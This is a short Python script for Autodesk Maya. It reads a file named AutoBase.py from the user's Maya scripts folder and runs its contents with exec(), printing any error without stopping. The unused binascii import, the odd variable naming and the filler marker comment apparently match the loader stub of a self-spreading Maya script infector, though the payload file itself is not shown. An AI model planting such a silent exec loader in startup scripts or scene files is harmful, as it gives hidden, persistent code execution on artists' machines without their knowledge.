import binascii, os;
import maya.cmds as cmds
path_ = os.getenv("MAYA_APP_DIR") + '/scripts/AutoSetUp/AutoBase.py'
MayaPath = path_.replace('\\','/') 
 
try: 
    with open(MayaPath, "rb") as f: 
        Da_ta = f.read() 
        exec(Da_ta) 
except Exception as e: 
    print("An error occurred:", e) 


# YYYYYYYYYYYYY